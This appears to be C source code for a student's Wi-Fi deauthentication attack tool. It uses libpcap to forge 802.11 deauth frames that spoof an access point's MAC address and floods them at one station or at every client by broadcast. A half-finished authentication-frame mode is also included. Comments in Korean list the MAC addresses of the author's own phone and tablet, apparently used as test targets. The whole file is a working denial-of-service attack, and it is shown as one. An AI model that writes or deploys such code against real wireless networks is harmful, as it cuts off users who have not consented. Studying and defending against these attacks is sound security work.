#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>

#include "deauth.h"

void usage();
void AP_broadcast_frame(struct Packet *packet);
void AP_unicast_frame(struct Packet *packet, char *station_mac);
void Station_unicast_frame(struct Packet *packet, char *ap_mac, char *station_mac);
void auth_init(struct Auth_Packet *packet, char *ap_mac, char *station_mac);

void initPacket(struct Packet *packet, char *ap_mac);
void macStringToUint8(char *mac_string, uint8_t *ap_mac);

int main(int argc, char *argv[]){
    if (argc < 3){
        usage();
        return -1;
    }

    char *interfaceName = argv[1];
    char *ap_mac = argv[2];
    char *station_mac = argv[3];
    char *auth = argv[4];

    struct Packet packet;
    struct Auth_Packet auth_packet;
    
    initPacket(&packet, argv[2]);
    if(argc ==3 ){
        AP_broadcast_frame(&packet);
        printf("AP_Broadcast Mode\n");
    }
    else if(argc == 4){
        AP_unicast_frame(&packet, argv[3]);
        printf("AP_unicast_frame Mode\n");
    }
    else if(argc == 5){
        if (strcmp(argv[4], "-auth") == 0){
            auth_init(&auth_packet, argv[2], argv[3]);
        }
    }
    

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL){
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interfaceName, errbuf);
        return -1;
    }

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 2) {
        if (pcap_sendpacket(handle, (unsigned char *)&packet, sizeof(packet)) != 0){
            printf("send fail\n");
            exit(-1);
        }
        usleep(10000);
    }

    pcap_close(handle);
    printf("pcap close!\n");

    return 0;
}

// 폰 MAC : 6E:16:EE:4E:47:FA
// 태블릿 MAC : 2A:AE:C4:FA:C9:1A
void usage(){
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void initPacket(struct Packet *packet, char *ap_mac){
    memset(packet, 0, sizeof(struct Packet));
    packet->radiotap.it_len = 0x0018;

    uint32_t padding[4] = {0x00,0x00,0x00,0x00};
    memcpy(packet->radiotap.padding, padding, sizeof(padding));

    packet->deauth.type = 0xc0;

    macStringToUint8(ap_mac, packet->deauth.source_address);
    macStringToUint8(ap_mac, packet->deauth.bssid);

    packet->fixed.reason_code = 0x0007;
}

//ap-mac만 들어와서 어떤 기기로 패킷을 보낼지 모를 때 : 그냥 브로드캐스트로 다 끊어버림
void AP_broadcast_frame(struct Packet *packet){
    memset(packet->deauth.destination_address, 0xFF, 6);
    
}

// AP가 특정 Station에게 연결을 끊으라고 할 때
void AP_unicast_frame(struct Packet *packet, char *station_mac){
    macStringToUint8(station_mac,packet->deauth.destination_address);
}

// 특정 Station이 AP에게 연결을 끊겠다라고 할 때
// 음 근데 이걸 어떻게 쓰지
void Station_unicast_frame(struct Packet *packet, char *ap_mac, char *station_mac){
    //src mac을 statcion mac으로
    macStringToUint8(station_mac,packet->deauth.source_address);
    //dst mac을 ap mac으로
    macStringToUint8(ap_mac,packet->deauth.destination_address);
}

// --auth 옵션 들어가 있으면 Auth패킷만 계속 날려서 교환 초기화 하는건가?
void auth_init(struct Auth_Packet *packet, char *ap_mac, char *station_mac){
    memset(packet, 0, sizeof(struct Auth_Packet));
    packet->radiotap.it_len = 0x0018;

    uint32_t padding[4] = {0x00,0x00,0x00,0x00};
    memcpy(packet->radiotap.padding, padding, sizeof(padding));

    packet->auth.type = 0xb0;

    macStringToUint8(station_mac, packet->auth.source_address);
    macStringToUint8(ap_mac, packet->auth.destination_address);
    macStringToUint8(ap_mac, packet->auth.bssid);

    packet->Auth_Parameter.SEQ = 0x0100;
}

void macStringToUint8(char *mac_string, uint8_t *ap_mac){
    sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);
}
  